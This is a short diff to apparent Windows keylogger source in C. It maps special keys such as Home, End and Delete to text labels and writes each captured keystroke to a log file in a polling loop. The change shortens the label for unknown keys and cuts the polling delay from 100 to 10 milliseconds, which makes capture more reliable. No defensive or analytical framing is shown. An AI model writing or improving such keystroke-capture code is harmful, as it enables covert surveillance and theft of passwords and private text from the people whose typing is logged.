@@ -300,14 +300,14 @@ int main() {
                         case VK_HOME:    strcpy(message, " [Home] "); break;
                         case VK_END:     strcpy(message, " [End] "); break;
                         case VK_DELETE:  strcpy(message, " [Del] "); break;
-                        default: snprintf(message, sizeof(message), " [Unknown: %d] ", i); break;
+                        default: snprintf(message, sizeof(message), " ?:%d ", i); break;
                     }
                 }
 
                 save_to(LOG_FILE, message);
             }
         }
-        Sleep(100); // Reduce CPU usage
+        Sleep(10); // Reduce CPU usage
     }
 
     return 0;
